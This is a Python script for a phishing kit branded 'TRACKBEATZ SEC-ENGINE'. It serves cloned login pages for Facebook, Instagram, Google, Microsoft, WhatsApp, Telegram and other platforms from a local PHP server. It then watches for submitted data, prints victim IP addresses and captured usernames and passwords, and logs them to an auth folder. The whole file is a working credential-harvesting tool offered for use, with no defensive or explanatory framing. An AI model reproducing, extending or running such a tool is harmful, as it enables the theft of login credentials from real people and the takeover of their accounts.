import os
import subprocess
import time
import sys
import shutil

# --- CONFIGURATION ---
VERSION = "2.3.7-track-xtended"
HOST = "127.0.0.1"
PORT = 8080
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WWW_DIR = os.path.join(BASE_DIR, ".server", "www")
AUTH_DIR = os.path.join(BASE_DIR, "auth")

# ANSI Colors
RED = "\033[31m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"

def banner():
    print(f"""{CYAN}
  ████████╗██████╗  █████╗  ██████╗██╗  ██╗
  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
     ██║   ██████╔╝███████║██║     █████╔╝ 
     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ 
     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{ORANGE}            TRACKBEATZ SEC-ENGINE {RED}v{VERSION}
{GREEN}  [{WHITE}-{GREEN}]{CYAN} WhatsApp & Telegram Data Modules Enabled{WHITE}{RESET}""")
os.system("clear")
def setup_env():
    """Ensure directories exist and clean old sessions."""
    for folder in [WWW_DIR, AUTH_DIR]:
        if not os.path.exists(folder):
            os.makedirs(folder)
    
    # Kill existing processes to free up ports
    processes = ["php", "cloudflared", "loclx"]
    for proc in reversed(processes):
        subprocess.run(["pkill", "-f", proc], stderr=subprocess.DEVNULL)

def start_server(website):
    """Host the site and prepare data capture."""
    site_path = os.path.join(BASE_DIR, ".sites", website)
    
    # Ensure template exists
    if not os.path.exists(site_path):
        print(f"\n{RED}[!] Error: Template '{website}' not found in .sites/{RESET}")
        return False

    # Refresh working directory
    if os.path.exists(WWW_DIR):
        shutil.rmtree(WWW_DIR)
    shutil.copytree(site_path, WWW_DIR)
    
    # Copy the IP logger
    ip_logger_src = os.path.join(BASE_DIR, ".sites", "ip.php")
    if os.path.exists(ip_logger_src):
        shutil.copy(ip_logger_src, WWW_DIR)

    print(f"{BLUE}[-] Launching PHP Server on {HOST}:{PORT}...{RESET}")
    subprocess.Popen(
        ["php", "-S", f"{HOST}:{PORT}", "-t", WWW_DIR],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    return True

def monitor_capture():
    """Real-time IP and Credential tracking."""
    ip_path = os.path.join(WWW_DIR, "ip.txt")
    cred_path = os.path.join(WWW_DIR, "usernames.txt")
    
    print(f"{ORANGE}[*] Monitoring for connections... (Ctrl+C to stop){RESET}")
    try:
        while True:
            # Capture IP Addresses
            if os.path.exists(ip_path):
                with open(ip_path, "r") as f:
                    ip_data = f.read().strip()
                print(f"\n{GREEN}[!] Victim IP Found: {WHITE}{ip_data}{RESET}")
                with open(os.path.join(AUTH_DIR, "ip.txt"), "a") as log:
                    log.write(f"{ip_data}\n")
                os.remove(ip_path)

            # Capture Account Data
            if os.path.exists(cred_path):
                print(f"\n{GREEN}[!!] Data Captured!{RESET}")
                with open(cred_path, "r") as f:
                    creds = f.read().strip()
                print(f"{CYAN}{creds}{RESET}")
                with open(os.path.join(AUTH_DIR, "usernames.dat"), "a") as log:
                    log.write(f"{creds}\n---\n")
                os.remove(cred_path)
            
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[-] Shutting down engine...{RESET}")
        setup_env()

def main_menu():
    setup_env()
    banner()
    
    # Extended options including WhatsApp and Telegram
    options = {
        "01": "facebook", "02": "instagram", "03": "google", "04": "microsoft",
        "10": "tiktok", "13": "snapchat", "18": "spotify",
        "36": "whatsapp", "37": "telegram" # NEW MODULES
    }

    print(f"\n{RED}[::]{ORANGE} Select Target Platform {RED}[::]{RESET}\n")
    print(f"{RED}[36]{ORANGE} WhatsApp      {RED}[37]{ORANGE} Telegram")
    print(f"{RED}[01]{ORANGE} Facebook      {RED}[02]{ORANGE} Instagram")
    
    choice = input(f"\n{RED}[-]{GREEN} Selection: {BLUE}").strip()
    
    # Auto-format single digits (e.g., '1' becomes '01')
    if len(choice) == 1: choice = "0" + choice

    if choice in options:
        if start_server(options[choice]):
            monitor_capture()
    elif choice == "00":
        sys.exit()
    else:
        print(f"{RED}[!] Invalid Selection.{RESET}")

if __name__ == "__main__":
    main_menu()
